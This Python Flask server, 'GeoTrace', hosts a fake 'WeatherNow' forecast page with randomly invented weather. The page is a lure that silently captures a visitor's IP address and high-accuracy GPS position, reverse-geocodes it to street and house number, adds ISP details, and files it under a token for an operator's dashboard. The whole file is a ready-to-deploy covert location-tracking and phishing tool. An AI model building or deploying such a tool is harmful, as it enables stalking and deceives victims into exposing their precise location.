"""
GeoTrace Backend — Railway/Render Deployment Ready
pip install flask flask-cors requests gunicorn
python server.py
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests, threading, time, uuid, os

app = Flask(__name__)
CORS(app, origins="*")

# Session store — 5 min auto delete
sessions = {}
SESSION_TTL = 5 * 60

def cleanup_loop():
    while True:
        time.sleep(60)
        now = time.time()
        dead = [t for t, s in list(sessions.items()) if now - s["last_seen"] > SESSION_TTL]
        for t in dead:
            del sessions[t]

threading.Thread(target=cleanup_loop, daemon=True).start()

# ── IP INFO ────────────────────────────────────────────
def get_ip_info(ip=None):
    try:
        fields = "status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,query"
        url = f"http://ip-api.com/json/{ip}?fields={fields}" if ip else f"http://ip-api.com/json/?fields={fields}"
        d = requests.get(url, timeout=6).json()
        if d.get("status") == "success":
            return {"status":"success","ip":d.get("query",""),"city":d.get("city",""),
                    "region":d.get("regionName",""),"country":d.get("country",""),
                    "country_code":d.get("countryCode",""),"lat":d.get("lat"),
                    "lon":d.get("lon"),"isp":d.get("isp",""),"org":d.get("org",""),
                    "timezone":d.get("timezone",""),"zip":d.get("zip","")}
        return {"status":"fail","message":d.get("message","failed")}
    except Exception as e:
        return {"status":"fail","message":str(e)}

# ── REVERSE GEOCODE ─────────────────────────────────────
def reverse_geocode(lat, lon):
    try:
        # zoom:18 = most precise (building/house level)
        d = requests.get("https://nominatim.openstreetmap.org/reverse",
            params={"lat":lat,"lon":lon,"format":"json","zoom":18,"addressdetails":1},
            headers={"User-Agent":"GeoTrace/2.0"}, timeout=8).json()
        a = d.get("address", {})

        # Most precise city-level name (priority order)
        city = (
            a.get("city") or
            a.get("town") or
            a.get("village") or
            a.get("suburb") or
            a.get("neighbourhood") or
            a.get("quarter") or
            a.get("hamlet") or
            a.get("county") or
            a.get("municipality") or
            "Unknown"
        )

        # Most precise road/street name
        road = (
            a.get("road") or
            a.get("pedestrian") or
            a.get("footway") or
            a.get("path") or
            a.get("cycleway") or
            ""
        )

        # House number + road for max precision
        house = a.get("house_number","")
        full_road = (house + " " + road).strip() if house else road

        return {
            "city":         city,
            "suburb":       a.get("suburb","") or a.get("neighbourhood",""),
            "state":        a.get("state",""),
            "state_district": a.get("state_district",""),
            "country":      a.get("country",""),
            "country_code": a.get("country_code","").upper(),
            "postcode":     a.get("postcode",""),
            "road":         full_road,
            "house_number": house,
            "display":      d.get("display_name",""),
        }
    except Exception as e:
        print(f"[GeoCode Error] {e}")
        return {"city":"Unknown","error":str(e)}

# ── ROUTES ─────────────────────────────────────────────
@app.route("/api/ip")
def api_my_ip():
    fwd = request.headers.get("X-Forwarded-For","")
    ip  = fwd.split(",")[0].strip() if fwd else request.remote_addr
    if ip in ("127.0.0.1","::1"): ip = None
    return jsonify(get_ip_info(ip))

@app.route("/api/ip/<ip>")
def api_ip_lookup(ip):
    return jsonify(get_ip_info(ip))

@app.route("/api/reverse")
def api_reverse():
    lat = request.args.get("lat")
    lon = request.args.get("lon") or request.args.get("lng")
    if not lat or not lon:
        return jsonify({"error":"lat and lon required"}), 400
    return jsonify(reverse_geocode(lat, lon))

@app.route("/api/ngrok-url")
def api_ngrok_url():
    return jsonify({"url": request.host_url.rstrip("/")})

@app.route("/api/session")
def api_session():
    token = uuid.uuid4().hex
    sessions[token] = {"captures": [], "last_seen": time.time()}
    return jsonify({"token": token})

@app.route("/api/capture", methods=["POST"])
def api_capture():
    data = request.get_json(force=True) or {}
    token = data.pop("token", "")
    fwd  = request.headers.get("X-Forwarded-For","")
    data["captured_ip"] = fwd.split(",")[0].strip() if fwd else request.remote_addr
    data["timestamp"]   = time.strftime("%Y-%m-%d %H:%M:%S")
    # server-side reverse geocode — always enrich for GPS captures
    lat = data.get("lat"); lon = data.get("lon") or data.get("lng")
    if lat and lon:
        try:
            lat_f = float(lat); lon_f = float(lon)
        except:
            lat_f = lat; lon_f = lon

        # Always reverse geocode GPS method for max accuracy
        # For IP method, only if city is missing
        if data.get("method") == "gps" or not data.get("city"):
            geo = reverse_geocode(lat_f, lon_f)
            data.update({
                "city":        geo.get("city",""),
                "suburb":      geo.get("suburb",""),
                "state":       geo.get("state",""),
                "country":     geo.get("country",""),
                "country_code":geo.get("country_code",""),
                "road":        geo.get("road",""),
                "postcode":    geo.get("postcode",""),
                "display":     geo.get("display",""),
            })

    # Enrich with ISP data from captured IP
    if not data.get("isp") and data.get("captured_ip"):
        ip_info = get_ip_info(data["captured_ip"])
        if ip_info.get("status") == "success":
            data["isp"]    = ip_info.get("isp","")
            data["org"]    = ip_info.get("org","")
            if not data.get("city"):
                data["city"]    = ip_info.get("city","")
                data["country"] = ip_info.get("country","")

    if token and token in sessions:
        sessions[token]["captures"].append(data)
        sessions[token]["last_seen"] = time.time()
        num = len(sessions[token]["captures"])
    else:
        num = 0

    print(f"[CAPTURE #{num}] {data['timestamp']} | {data.get('method','?').upper()} | "
          f"{data.get('city','?')}, {data.get('country','?')}")
    return jsonify({"status":"ok","captured":num})

@app.route("/api/captures")
def api_captures():
    token = request.args.get("token","")
    if not token or token not in sessions:
        return jsonify([])
    sessions[token]["last_seen"] = time.time()
    return jsonify(sessions[token]["captures"])

# ── FAKE WEATHER PAGE ───────────────────────────────────
FAKE_WEATHER_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>WeatherNow — Live Local Forecast</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(160deg,#0f2b5b,#1a4080 40%,#0a1a3a);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;padding:1.5rem 1rem 3rem}
header{width:100%;max-width:500px;display:flex;justify-content:space-between;align-items:center;margin-bottom:2rem}
.brand{font-weight:700;font-size:1rem;color:#fff;letter-spacing:1px}.brand span{color:#60b4ff}
nav a{color:rgba(255,255,255,.5);text-decoration:none;font-size:.8rem;margin-left:1.2rem}
nav a:hover{color:#fff}
.card{background:rgba(255,255,255,.1);backdrop-filter:blur(24px);border:1px solid rgba(255,255,255,.18);border-radius:28px;padding:2.5rem 2.5rem 2rem;max-width:440px;width:100%;box-shadow:0 24px 64px rgba(0,0,0,.5)}
.loading{display:flex;flex-direction:column;align-items:center;gap:1.2rem;padding:2rem 0}
.spinner{width:44px;height:44px;border:3px solid rgba(255,255,255,.2);border-top-color:#60b4ff;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.load-txt{color:rgba(255,255,255,.6);font-size:.9rem}
#wc{display:none;text-align:center}
.city{font-size:1.9rem;font-weight:700;margin-bottom:.2rem}
.country{font-size:.9rem;color:rgba(255,255,255,.6);margin-bottom:1.8rem}
.wicon{font-size:5.5rem;line-height:1;margin:.5rem 0}
.temp{font-size:5rem;font-weight:200;line-height:1}
.temp sup{font-size:1.8rem;vertical-align:top;margin-top:1rem;font-weight:400}
.cond{font-size:1.1rem;color:rgba(255,255,255,.75);margin:.8rem 0 2rem}
.details{display:grid;grid-template-columns:repeat(3,1fr);gap:.8rem;border-top:1px solid rgba(255,255,255,.12);padding-top:1.5rem}
.di{text-align:center}.dv{font-size:1.15rem;font-weight:600}
.dl{font-size:.65rem;color:rgba(255,255,255,.5);letter-spacing:1.5px;margin-top:.3rem;text-transform:uppercase}
.fc{display:flex;justify-content:space-between;margin-top:1.8rem;padding-top:1.5rem;border-top:1px solid rgba(255,255,255,.1)}
.fd{text-align:center;font-size:.75rem;color:rgba(255,255,255,.6)}.fi{font-size:1.3rem;margin:.3rem 0}.ft{font-size:.85rem;font-weight:600;color:#fff}
.upd{font-size:.7rem;color:rgba(255,255,255,.35);margin-top:1.5rem;text-align:center}
.err{background:rgba(255,80,80,.15);border:1px solid rgba(255,80,80,.35);border-radius:12px;padding:1.2rem;margin-top:1rem;font-size:.88rem;color:#ffaaaa;text-align:center}
</style>
</head>
<body>
<header>
  <div class="brand">🌤 Weather<span>Now</span></div>
  <nav><a href="#">Forecast</a><a href="#">Radar</a><a href="#">Maps</a><a href="#">Alerts</a></nav>
</header>
<div class="card">
  <div class="loading" id="ld"><div class="spinner"></div><div class="load-txt" id="lt">Detecting your location...</div></div>
  <div id="wc">
    <div class="city" id="cn">—</div><div class="country" id="co">—</div>
    <div class="wicon" id="wi">⛅</div>
    <div class="temp"><span id="wt">--</span><sup>°C</sup></div>
    <div class="cond" id="wc2">Partly cloudy</div>
    <div class="details">
      <div class="di"><div class="dv" id="wh">—</div><div class="dl">Humidity</div></div>
      <div class="di"><div class="dv" id="ww">—</div><div class="dl">Wind</div></div>
      <div class="di"><div class="dv" id="wf">—</div><div class="dl">Feels Like</div></div>
    </div>
    <div class="fc" id="fc"></div>
    <div class="upd" id="upd">Updating...</div>
  </div>
  <div class="err" id="eb" style="display:none">Could not get weather. Please allow location access and reload.</div>
</div>
<script>
var S   = window.location.origin;
var tkn = new URLSearchParams(window.location.search).get('t') || '';
var ic  = ['☀️','🌤','⛅','🌥','🌦','🌧','⛈','🌩','🌨','🌫','🌬'];
var cd  = ['Sunny','Partly cloudy','Mostly cloudy','Light rain','Overcast','Heavy rain','Thunderstorm','Clear sky','Light snow','Mist'];
var dys = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
function r(a){return a[Math.floor(Math.random()*a.length)];}
function rn(a,b){return Math.floor(Math.random()*(b-a))+a;}

function showWeather(city,country){
  document.getElementById('ld').style.display='none';
  document.getElementById('wc').style.display='block';
  document.getElementById('cn').textContent=city||'Unknown';
  document.getElementById('co').textContent=country||'';
  document.getElementById('wi').textContent=r(ic);
  var t=rn(8,42);
  document.getElementById('wt').textContent=t;
  document.getElementById('wf').textContent=(t-rn(1,6))+'°C';
  document.getElementById('wc2').textContent=r(cd);
  document.getElementById('wh').textContent=rn(30,95)+'%';
  document.getElementById('ww').textContent=rn(3,40)+' km/h';
  document.getElementById('upd').textContent='Last updated: '+new Date().toLocaleTimeString();
  var fc=document.getElementById('fc'),today=new Date();
  fc.innerHTML='';
  for(var i=1;i<=5;i++){
    var d=new Date(today);d.setDate(today.getDate()+i);
    var hi=rn(10,42),lo=hi-rn(3,10);
    fc.innerHTML+='<div class="fd"><div>'+dys[d.getDay()]+'</div><div class="fi">'+r(ic.slice(0,6))+'</div><div class="ft">'+hi+'°/'+lo+'°</div></div>';
  }
}

// Token hamesha attach karo
function cap(data){
  data.token = tkn;
  fetch(S+'/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
}

// IP CAPTURE — location off ho ya GPS deny ho
var ipDone  = false;
var gpsDone = false;

function localTime(){
  return new Date().toLocaleString('en-IN',{day:'2-digit',month:'short',year:'numeric',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:true});
}

function tryIP(){
  if(ipDone) return;
  fetch(S+'/api/ip')
    .then(function(res){ return res.json(); })
    .then(function(d){
      if(ipDone) return;
      if(d.status==='success' && d.city){
        ipDone = true;
        document.getElementById('cn').textContent = d.city;
        document.getElementById('co').textContent = d.country || '';
        cap({method:'ip',lat:d.lat,lon:d.lon,
             city:d.city,country:d.country,ip:d.ip,isp:d.isp,
             client_time:localTime()});
      } else {
        setTimeout(tryIP, 4000);
      }
    }).catch(function(){
      setTimeout(tryIP, 4000);
    });
}

// Turant weather dikhao + IP start
showWeather('Loading...','');
tryIP();

// GPS CAPTURE — location on ho toh
if(navigator.geolocation){
  var bestAcc=Infinity, bestLat=null, bestLon=null, wid=null;

  function sendGPS(lat,lon,acc){
    if(gpsDone) return;
    gpsDone = true;
    ipDone  = true; // IP rok do
    if(wid!=null){ navigator.geolocation.clearWatch(wid); }
    fetch(S+'/api/reverse?lat='+lat+'&lon='+lon)
      .then(function(res){ return res.json(); })
      .then(function(d){
        if(d.city){ document.getElementById('cn').textContent = d.city; }
        if(d.country){ document.getElementById('co').textContent = d.country; }
        cap({method:'gps',lat:lat,lon:lon,
             city:d.city,suburb:d.suburb,state:d.state,
             country:d.country,country_code:d.country_code,
             road:d.road,postcode:d.postcode,
             accuracy:Math.round(acc),client_time:localTime()});
      }).catch(function(){
        cap({method:'gps',lat:lat,lon:lon,
             accuracy:Math.round(acc),client_time:localTime()});
      });
  }

  // 12 sec mein best fix bhejo
  var deadline = setTimeout(function(){
    if(!gpsDone && bestLat!==null){ sendGPS(bestLat,bestLon,bestAcc); }
  },12000);

  wid = navigator.geolocation.watchPosition(
    function(p){
      var lat=p.coords.latitude, lon=p.coords.longitude, acc=p.coords.accuracy;
      if(acc < bestAcc){ bestAcc=acc; bestLat=lat; bestLon=lon; }
      // Pehla fix milte hi turant bhejo — koi threshold nahi
      if(!gpsDone){
        clearTimeout(deadline);
        sendGPS(lat,lon,acc);
      }
    },
    function(e){
      // GPS deny — IP se kaam chalega
      clearTimeout(deadline);
      if(wid!=null){ navigator.geolocation.clearWatch(wid); }
    },
    {enableHighAccuracy:true, timeout:15000, maximumAge:0}
  );
}
</script>
</body>
</html>"""

@app.route("/weather")
@app.route("/forecast/world")
@app.route("/forecast/<path:p>")
def fake_weather(p=None):
    return FAKE_WEATHER_HTML

@app.route("/")
@app.route("/dashboard")
def dashboard():
    return send_file("index.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print("\n"+"="*55)
    print(f"  GeoTrace Server — port {port}")
    print("="*55+"\n")
    app.run(host="0.0.0.0", port=port, debug=False)